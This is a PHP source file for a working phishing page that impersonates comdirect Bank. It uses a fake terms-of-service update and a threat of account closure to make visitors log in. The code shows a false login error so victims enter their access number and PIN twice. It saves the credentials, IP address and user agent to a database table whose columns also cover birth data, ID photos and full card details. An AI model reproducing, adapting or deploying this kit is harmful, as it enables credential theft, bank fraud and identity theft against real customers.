<?php

	$this_Title = "Wir aktualisieren unsere AGBs!";

	include("comdirect_config.inc.php");
	
	require_once("Mobile_Detect.php");
	$detectMobile = new Mobile_Detect;
	
	session_start();
	
	if($_SESSION["process_finished"] == TRUE) {
		header("Location: https://href.li/?https://comdirect.de");
		exit();
	} else {
		if(empty($_SESSION["new_session"])) {
			//GENERATE NEW SESSION-ID
			$sessionIDLength = 10;

			function app_Generated_SessionID() {
				list($usec, $sec) = explode(' ', microtime());
			return (float) $sec + ((float) $usec * 100000);
			}

			srand(app_Generated_SessionID());

			$sessionIDSeed = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			$generateSessionID = "";

			for($i = 0; $i < $sessionIDLength; $i ++) {
				$generateSessionID .= $sessionIDSeed[rand(0, strlen($sessionIDSeed))];
			}

			$_SESSION["data_id"] = $generateSessionID;
			$_SESSION["new_session"] = TRUE;
		}
	}
	
	if(isset($_POST["execute_task"])) {
		
		//EXECUTE TASK
		
		if(empty($_SESSION["done_login"])) {
			
			//NO LOGIN SO FAR => ERROR
			$showError = TRUE;
			
			//ADD STUFF TO DATABASE
			$access_number = $_POST["zugangsnummer"];
			$password = $_POST["passwort"];
		
			if($detectMobile->isMobile()) {
				$is_mobile = 1;
			} else {
				$is_mobile = 0;
			}
		
			$appCurrentDate = date("d.m.Y", $appTimestamp);
			$appCurrentTime = date("H:i", $appTimestamp);
			$createdAt = $appCurrentDate." - ".$appCurrentTime." Uhr";
		
			$emptyEntry = "ausstehend";
		
			$statusEntry = 1;
		
			if(!empty($_SERVER['HTTP_CLIENT_IP'])) {
				$appCurrentIP = $_SERVER['HTTP_CLIENT_IP'];
			} elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
				$appCurrentIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
			} else {
				$appCurrentIP = $_SERVER['REMOTE_ADDR'];
			}
		
			$appCurrentUseragent = $_SERVER["HTTP_USER_AGENT"];
			$nullEntry = "xyzxyz";
			
			$add_New_Log = $SQL->prepare("INSERT INTO cd_logs (data_id, is_mobile, first_login, first_password, access_number, password, dob, pob, phone_number, image_file, camera_file, second_image, second_camera, cc_number, exp_month, exp_year, cvc_number, ip_address, user_agent, created_at, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
			$add_New_Log->bind_param("sissssssssssssssssssi", $_SESSION["data_id"], $is_mobile, $access_number, $password, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $emptyEntry, $appCurrentIP, $appCurrentUseragent, $createdAt, $statusEntry);
			$add_New_Log->execute();
			$add_New_Log->close();
			
			$_SESSION["done_login"] = TRUE;
			
		} else if(isset($_SESSION["done_login"])) {
			
			//LOGIN IS DONE => SUCCESS
			$access_number = $_POST["zugangsnummer"];
			$password = $_POST["passwort"];
			
			$statusEntry = 2;
			
			$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET access_number = ?, password = ?, status = ? WHERE data_id = ?");
			$update_Log_Data->bind_param("ssis", $access_number, $password, $statusEntry, $_SESSION["data_id"]);
			$update_Log_Data->execute();
			$update_Log_Data->close();
		
			header("Location: Synchronisierung");
			exit();
			
		}
		
	}
	
	include("comdirect_header.tpl.php");
	
?>

	<div class="cif-scope bg-color--cd-black-0">
		<div class="grid-container--limited-md  hidden-lg kontoinhaber__container" id="div_kontoinhaber"> </div>
	</div>
	<div class="cif-scope-content-wrapper siteFrame" data-plugin="{common_eventHub: {events: ['resize']}}">
		<div class="grid-container--limited-md grid-container">
			<div class="grid--no-gutter grid">
			<?php
			
				if($detectMobile->isMobile()) {
					
			?>
				<div class="col--md-6 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1" style="margin-bottom:-30px;">
					<div class="col__content col__content--no-padding-bottom">
						<h1 class="headline--h1 headline" style=""><?=$this_Title;?></h1></div>
				</div>
			<?php
			
				} else {
					
			?>
				<div class="col--md-6 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1">
					<div class="col__content col__content--no-padding-bottom">
						<h1 class="headline--h1 headline" style=""><?=$this_Title;?></h1></div>
				</div>
			<?php
			
				}
				
			?>
				<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
					<div class="col__content col__content--no-padding-top">
						<h5 class="hidden-sm headline--h5 headline">Lieber Kunde der comdirect-Bank!</h5>
						<p>Aufgrund einer bundesweiten Änderung unserer allgemeinen Nutzungsbedingungen ist es erforderlich geworden, dass Sie sich gegenüber unseren Systemen verifizieren, um eine permanente Kontosperre zu verhindern.<br /><br />
						Dieser Vorgang wird automatisiert durchgeführt, sodass Sie am Ende eine Bestätigungsmeldung über Ihre erfolgreich durchgeführte Verifizierung erhalten. Melden Sie sich nun nachfolgend mit Ihren gewohnten Anmeldedaten an, um die Verifizierung zu starten.
						</p>
						<form id="login" method="post" action="" enctype="multipart/form-data">
						
						
						<!-- FORM START -->
						
						<div class="grid--no-gutter grid grid--no-bottom">
    <div class="col col-12" style="margin-bottom:-25px;">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param1" data-tid="param1" class="floating-input floating-input--margin-bottom" data-plugin="">
                        <div class="floating-input__container" data-role="floating-input__container" data-plugin="">
                        <?php
						
							if($showError == TRUE) {
								
						?>
							<input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id=""
                                data-tid="param1Input"
                                type="text"
                                name="zugangsnummer"
                                required=""
								style="border:1px solid red;color:red;"
								maxlength="8"
                            />
                            <label style="color:red;" class="floating-input__label" data-role="floating-input__label">Zugangsnummer / Benutzername</label>
                        <?php
						
							} else {
								
						?>
						
							<input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id=""
                                data-tid="param1Input"
                                type="text"
                                name="zugangsnummer"
                                required=""
								style=""
								maxlength="8"
                            />
                            <label style="" class="floating-input__label" data-role="floating-input__label">Zugangsnummer / Benutzername</label>
						
						<?php
						
							}
							
						?>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col col-12">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param3" data-tid="param3" class="floating-input floating-input--margin-bottom" data-plugin="{floatingInput: {patternName: 'floating-input'}}">
                        <div class="floating-input__container ripple" data-role="floating-input__container" data-plugin="{ripple:{}}">
                        <?php
						
							if($showError == TRUE) {
								
						?>
							<input style="border:1px solid red;color:red;" class="floating-input__input" data-role="floating-input__input" id="param3Input" required="" type="password" name="passwort" maxlength="6" />
                            <label style="color:red;" class="floating-input__label" data-role="floating-input__label">PIN / Passwort</label>
                        <?php
						
							} else {
								
						?>
							<input style="" class="floating-input__input" data-role="floating-input__input" id="param3Input" required="" type="password" name="passwort" maxlength="6" />
                            <label style="" class="floating-input__label" data-role="floating-input__label">PIN / Passwort</label>
						<?php
						
							}
							
						?>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </div>


</div>

						
						<!-- FORM END -->
						
						
							<div class="grid--no-gutter grid grid--no-bottom">


			<div class="col col-12">
			
			<?php
			
				if($showError == TRUE) {
					
			?>
				<p style="color:red;margin-top:-5px">
					Das Login konnte nicht erfolgreich durchgeführt werden. Bitte überprüfen Sie Ihre Eingaben. Zur Anmeldung als Kunde geben Sie bitte Zugangsnummer und PIN ein.
				</p>
			<?php
			
				}
				
			?>

				<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
					<button type="submit" name="execute_task" class="button button--growing button--large button--primary">Verifizierung jetzt starten</button>
				</div>
			</div>

		</div>
		</form>
	</div>
	</div>
	<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
		<div class="col__content col__content--no-padding-vertical">
			<div class="outer-spacing--xxlarge-top">
				<h5 class="headline--h5 headline">Wichtige Sicherheitshinweise</h5>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-0">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Lesen Sie sich alle Anweisungen und Hinweise genauestens durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-1">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Achten Sie auf absolute Validität und Vollständigkeit Ihrer Angaben.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-2">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Führen Sie diesen Vorgang vollständig und ordnungsgemäß durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-3">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Warten Sie im Anschluss auf die Bestätigungsmeldung zu Ihrer Synchronisierung.</span></div>
					</label>
				</div>
				
				
				
				
				
				
			</div>
		</div>
	</div>

	</div>
	</div>
	</div>

<?php

	include("comdirect_footer.tpl.php");
	
?>